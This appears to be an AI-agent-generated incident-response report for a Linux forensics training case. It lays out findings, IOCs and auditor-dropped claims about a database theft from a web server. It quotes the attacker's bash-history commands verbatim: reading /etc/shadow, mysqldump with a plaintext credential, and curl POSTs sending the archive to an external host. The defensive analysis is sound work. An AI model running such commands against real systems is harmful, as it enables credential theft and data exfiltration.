# LinuxIR Report — case `for577`

Evidence scope: `/home/sansforensics/linuxir-agent/evidence/for577/data`

## Confidence distribution (confirmed findings)

| Confidence | Count | % |
|---|---|---|
| HIGH | 1 | 20.0% |
| MEDIUM | 4 | 80.0% |
| LOW | 0 | 0.0% |
| UNVERIFIED | 0 | 0.0% |

**5 confirmed findings.** 1 flagged for human review. 5 findings dropped by the auditor (see below).

## Key deliverables

- **Mandatory IR answers:** [[compromise-answers]]
- **IOC / IOA / TTP:** [[ioc-ttp]]
- **Recommendations:** [[recommendations]]
- **Attacker profile:** [[attacker-profile]] · **Timeline:** [[timeline]] · **Narrative:** [[narrative]]
- **Expert analysis:** [[analysis-polished]]

## Confirmed findings

### WEB-01 root shell exfiltrated stolen database dumps to external host mosaic-metrics.net
- **id:** `web01-root-db-exfil`
- **confidence:** MEDIUM
- **technique:** T1048 Exfiltration Over Alternative Protocol / T1567 Exfiltration Over Web Service / T1005 Data from Local System / T1041
- **hallucination_risk:** low
- **evidence:** `/home/sansforensics/linuxir-agent/evidence/for577/data/WEB-01.northbridgefs.local/bash_history/root.bash_history lines 4-18`

root.bash_history on WEB-01 records the attacker using compromised MySQL credentials (cms_ro:Winter2026!) to reach the internal DB server 10.42.31.15, dumping sensitive 'reports' tables (quarterly_rollups, forecast_models, board_packages) into a hidden staging directory /var/tmp/.cache, gzip-compressing them, and POSTing the archive to the external domain mosaic-metrics.net via curl --data-binary (two endpoints: /upload and /api/v1/collect). This is staged collection followed by exfiltration over HTTPS to attacker-controlled web infrastructure. Epoch timestamps cluster around 1776266532-1776277081 (~2026-04-15 UTC).

<details><summary>cited tool output</summary>

```
mysql -h 10.42.31.15 -u cms_ro -pWinter2026! -e 'show databases;'
mysqldump -h 10.42.31.15 -u cms_ro -pWinter2026! reports quarterly_rollups > /var/tmp/.cache/q2_rollup.sql
mkdir -p /var/tmp/.cache
mysqldump -h 10.42.31.15 -u cms_ro -pWinter2026! reports quarterly_rollups forecast_models board_packages > /var/tmp/.cache/q3_rollup.dat
gzip -f /var/tmp/.cache/q3_rollup.dat
curl -m 15 -X POST --data-binary @/var/tmp/.cache/q3_rollup.dat.gz https://mosaic-metrics.net/upload
curl -sS -X POST --data-binary @/var/tmp/.cache/q3_rollup.dat.gz https://mosaic-metrics.net/api/v1/collect
```

</details>

_Source: [[analysis-None]]_

### No on-disk persistence artifacts present in evidence (collection is log-only, not full filesystems)  ⚠️ **requires human review**
- **id:** `persistence-artifacts-absent-scope`
- **confidence:** MEDIUM
- **technique:** N/A (evidence-coverage limitation)
- **hallucination_risk:** moderate
- **evidence:** `/home/sansforensics/linuxir-agent/evidence/for577/data/WEB-01.northbridgefs.local`, `/home/sansforensics/linuxir-agent/evidence/for577/data/DB-01.northbridgefs.local`

All standard persistence checks (cron, systemd units, authorized_keys, rc/init/profile files, ld.so.preload, /etc/passwd diff, setuid, wtmp/btmp) returned nothing because the evidence set is a curated per-host log collection (each host directory contains only bash_history/, syslog.log, and web_access.log; the network sensors contain zeek json) — not mounted root filesystems or disk images. Therefore the absence of cron/systemd/SSH-key/passwd backdoors here is NOT evidence that none exist; those artifact classes were not collected. The only host-based attacker artifacts recoverable from this collection are the shell-history records on WEB-01. A cross-host sweep of every *bash_history file found the exfil/credential IOCs (mosaic-metrics.net, /var/tmp/.cache, nb-maint, cms_ro/Winter2026!, bash -p, --data-binary) confined to WEB-01 root.bash_history only.

<details><summary>cited tool output</summary>

```
[no cron artifacts found in evidence scope]
[no systemd units found in evidence scope]
[no authorized_keys files found in evidence scope]
[no rc/init/profile files found in evidence scope]
[no ld.so.preload or LD_PRELOAD environment entries found]
[no /etc/passwd found in evidence scope]
[no setuid/setgid files found in evidence scope]
[no wtmp/btmp/utmp files found in evidence scope]
WEB-01 listing: d bash_history / - syslog.log / - web_access.log
grep -rl "mosaic-metrics|/var/tmp/.cache|nb-maint" ... --include=*bash_history -> only .../WEB-01.../root.bash_history
```

</details>

_Source: [[analysis-None]]_

### Database dump exfiltrated from WEB-01 (10.42.20.20) to mosaic-metrics.net
- **id:** `web01-db-exfil-mosaic-metrics`
- **confidence:** HIGH
- **technique:** T1041 Exfiltration Over C2 Channel / T1567 Exfiltration Over Web Service
- **hallucination_risk:** low
- **evidence:** `/home/sansforensics/linuxir-agent/evidence/for577/data/WEB-01.northbridgefs.local/bash_history/root.bash_history`, `/home/sansforensics/linuxir-agent/evidence/for577/data/zeek-dmz-01/dns.json`, `/home/sansforensics/linuxir-agent/evidence/for577/data/zeek-dmz-01/ssl.json`

WEB-01 root.bash_history shows the attacker dumping finance databases (quarterly_rollups, forecast_models, board_packages) from MySQL host 10.42.31.15 using the cms_ro credential, staging the gzip in a hidden dir /var/tmp/.cache, then POSTing it to the external host mosaic-metrics.net via curl. Zeek confirms the activity over the wire: WEB-01 (10.42.20.20) queried mosaic-metrics.net (resolved 103.27.202.93) and established TLS sessions to 103.27.202.93:443 at timestamps 1776275120 and 1776277081 — exactly matching the two curl command epochs in the bash history. This is confirmed data exfiltration (MITRE T1041 / T1567). Times convert to ~2026-04-15 14:04–19:02 UTC.

<details><summary>cited tool output</summary>

```
root.bash_history:
#1776273543
mysqldump -h 10.42.31.15 -u cms_ro -pWinter2026! reports quarterly_rollups forecast_models board_packages > /var/tmp/.cache/q3_rollup.dat
#1776273595
gzip -f /var/tmp/.cache/q3_rollup.dat
#1776275120
curl -m 15 -X POST --data-binary @/var/tmp/.cache/q3_rollup.dat.gz https://mosaic-metrics.net/upload
#1776277081
curl -sS -X POST --data-binary @/var/tmp/.cache/q3_rollup.dat.gz https://mosaic-metrics.net/api/v1/collect

zeek dns.json:
{"ts":1776275120.978138,...,"id.orig_h":"10.42.20.20",...,"query":"mosaic-metrics.net",...,"answers":["103.27.202.93"]}
zeek ssl.json:
{"ts":1776275122.910892,...,"id.orig_h":"10.42.20.20",...,"id.resp_h":"103.27.202.93","id.resp_p":443,...,"server_name":"mosaic-metrics.net",...,"established":true}
{"ts":1776277083.504463,...,"id.orig_h":"10.42.20.20",...,"id.resp_h":"103.27.202.93","id.resp_p":443,...,"server_name":"mosaic-metrics.net",...,"established":true}
```

</details>

_Source: [[analysis-None]]_

### Credential access (/etc/shadow) and finance-DB enumeration as root on WEB-01
- **id:** `web01-db-credential-access-recon`
- **confidence:** MEDIUM
- **technique:** T1003 OS Credential Dumping / T1213 Data from Information Repositories
- **hallucination_risk:** low
- **evidence:** `/home/sansforensics/linuxir-agent/evidence/for577/data/WEB-01.northbridgefs.local/bash_history/root.bash_history`

Before exfiltration, the WEB-01 root shell read /etc/shadow via a privilege-preserving bash invocation (/bin/bash -p -c 'id; cat /etc/shadow | head -n 3') and enumerated the MySQL server at 10.42.31.15 using the cms_ro:Winter2026! credential — listing databases, then the reports DB's report_index table — to locate sensitive board/forecast data before dumping it. This is credential access plus internal data-source discovery preceding the exfil. The cms_ro database credential and the 10.42.31.15 DB host are key IOCs/pivot targets.

<details><summary>cited tool output</summary>

```
#1776261856
/bin/bash -p -c 'id; cat /etc/shadow | head -n 3'
#1776266532
mysql -h 10.42.31.15 -u cms_ro -pWinter2026! -e 'show databases;'
#1776269098
mysql -h 10.42.31.15 -u cms_ro -pWinter2026! reports -e 'show tables; select report_name, quarter, owner from report_index limit 20;'
#1776271062
mysqldump -h 10.42.31.15 -u cms_ro -pWinter2026! reports quarterly_rollups > /var/tmp/.cache/q2_rollup.sql
```

</details>

_Source: [[analysis-None]]_

### Bulk data exfiltration to external 23.72.209.230 over HTTPS from multiple workstations
- **id:** `exfil-23-72-209-230`
- **confidence:** MEDIUM
- **technique:** T1041 Exfiltration Over C2 Channel / T1567 Exfiltration Over Web Service
- **hallucination_risk:** low
- **evidence:** `evidence/for577/data zeek conn.json (focus_ip 23.72.209.230)`, `zeek_conn_summary top exfil destinations`

External IP 23.72.209.230 received ~17 MB outbound across only 6 flows on tcp/443, each flow strongly asymmetric (megabytes OUT, only bytes/KB IN) — the classic exfiltration signature, not normal web browsing. The transfers originate from FIVE different internal workstations (10.42.40.51, 10.42.40.81, 10.42.40.32, 10.42.40.91, 10.42.40.71) and span three days (2026-04-14 through 2026-04-16), indicating a coordinated/staged exfil channel rather than a single user action. Individual transfers: 2.99MB, 4.75MB, 2.52MB, 1.72MB, 0.83MB, 4.27MB out. GeoIP DB unavailable and no local intel match, so attribution/country is UNKNOWN.

<details><summary>cited tool output</summary>

```
== Top internal->external destinations by bytes SENT (exfil candidates) ==
  23.72.209.230: 17,076,490 bytes out over 6 flow(s)   [LARGE]

[conn flows involving 23.72.209.230: 6 shown of 840252 records]
  2026-04-14 15:52:23Z 10.42.40.51:45775 -> 23.72.209.230:443 tcp dur=31.279419 out=2994765 in=33338 SF
  2026-04-15 18:48:32Z 10.42.40.81:45632 -> 23.72.209.230:443 tcp dur=62.871706 out=4746834 in=6342 SF
  2026-04-16 08:27:01Z 10.42.40.32:50385 -> 23.72.209.230:443 tcp dur=34.829944 out=2517849 in=0 RSTO
  2026-04-16 19:33:06Z 10.42.40.91:37141 -> 23.72.209.230:443 tcp dur=43.962827 out=1719940 in=42875 SF
  2026-04-16 20:03:44Z 10.42.40.91:48285 -> 23.72.209.230:443 tcp dur=117.514522 out=828803 in=14460 SF
  2026-04-16 21:43:26Z 10.42.40.71:53147 -> 23.72.209.230:443 tcp dur=29.729053 out=4268299 in=2292 SF

ip 23.72.209.230: UNKNOWN [local-only] — internet-routable; no local match
[tool unavailable] geoiplookup is not installed; cannot geolocate 23.72.209.230.
```

</details>

_Source: [[analysis-None]]_

## Cross-artifact correlations

_No cross-artifact correlations._

## Expert analysis & threat intel

_Senior IR-expert review — full narrative in [[analysis-polished]]._

**MITRE ATT&CK coverage:** T1003 (Other), T1005 (Other), T1041 (Exfiltration), T1048 (Exfiltration), T1213 (Other), T1567 (Exfiltration)

**Threat-intel IOCs:** 10 enriched, 0 notable (malicious/suspicious).

| indicator | kind | verdict | detail |
|---|---|---|---|
| `10.42.20.20` | ip | **internal** | RFC1918 private address — internal host (lateral movement / insider context, not external C2) |
| `10.42.31.15` | ip | **internal** | RFC1918 private address — internal host (lateral movement / insider context, not external C2) |
| `10.42.40.32` | ip | **internal** | RFC1918 private address — internal host (lateral movement / insider context, not external C2) |
| `10.42.40.51` | ip | **internal** | RFC1918 private address — internal host (lateral movement / insider context, not external C2) |
| `10.42.40.71` | ip | **internal** | RFC1918 private address — internal host (lateral movement / insider context, not external C2) |
| `10.42.40.81` | ip | **internal** | RFC1918 private address — internal host (lateral movement / insider context, not external C2) |
| `10.42.40.91` | ip | **internal** | RFC1918 private address — internal host (lateral movement / insider context, not external C2) |
| `103.27.202.93` | ip | **unknown** | internet-routable; no local match (enable external lookups for more) |
| `23.72.209.230` | ip | **unknown** | internet-routable; no local match (enable external lookups for more) |
| `mosaic-metrics.net` | domain | **unknown** | no baseline match; label entropy normal |

## Auditor-dropped findings (transparency)

- **WEB-01 privileged shell read /etc/shadow and used hardcoded DB credentials (cms_ro:Winter2026!)** (`web01-root-cred-access`, from None) — dropped: The two commands and credentials (cms_ro/Winter2026!, 10.42.31.15) are verbatim present, but the output does not establish the source file (root.bash_history), attacker attribution, that this was the 'first' command, or that the MySQL authentication actually succeeded, so HIGH is unwarranted. _(risk: moderate)_
- **WEB-01 attacker performed anti-forensic cleanup of exfil archive and a dropped script /tmp/nb-maint.sh** (`web01-root-antiforensics`, from None) — dropped: The output confirms only an `rm -f` of the two paths; it provides no evidence of host (WEB-01), root session, timing after exfiltration, the .gz being stolen data, or the 'nb = NorthBridge' masquerading attribution—all of which are unsupported embellishment. _(risk: high)_
- **Anti-forensic cleanup of staged exfil archive and dropper on WEB-01** (`web01-antiforensics-cleanup`, from None) — dropped: The output confirms only the single rm command deleting both files; it does not substantiate the temporal link to exfil POSTs, the root session attribution, or that nb-maint.sh appears nowhere else in history. _(risk: moderate)_
- **No SSH brute force; key/credential-based access; logs show no tampering gaps** (`no-bruteforce-logs-intact`, from None) — dropped: The auth statistics (3 failed/975 accepted, 0 sudo, first publickey login by daniel.meyer, no gaps) are substantiated, but the WEB-01 root session, file-deletion anti-forensics, and daniel.meyer/isaac.green 'routine SRE' bash-history characterizations are absent from this output. _(risk: moderate)_
- **Risky-mime (octet-stream) binary transfers from internal host 10.42.30.35 over SMB** (`smb-octet-stream-staging-10-42-30-35`, from None) — dropped: Transfer bytes/IPs/timestamps/md5 and SSH flows (port 22) are supported, but the cited output contains no SMB/445 evidence or HTTP sessions, so the 'over SMB' title and 'SMB server to many internal clients/HTTP' claims are unsubstantiated embellishment. _(risk: moderate)_

## Method & limitations

- Evidence was treated as **read-only**; every tool call was vetted by the ConstraintEnforcer before execution and logged to `audit/tool-calls.jsonl`. Blocked evidence-mutation attempts (if any) are in `audit/spoliation-attempts.jsonl`.
- Each finding was verified by an independent auditor pass against the verbatim tool output it cites; unsubstantiated claims were dropped.
- Tools whose binaries are not installed on this host return an 'unavailable' result; affected analyses are necessarily incomplete (not absent-of-evidence).


Agent notes: [[analysis-polished]]
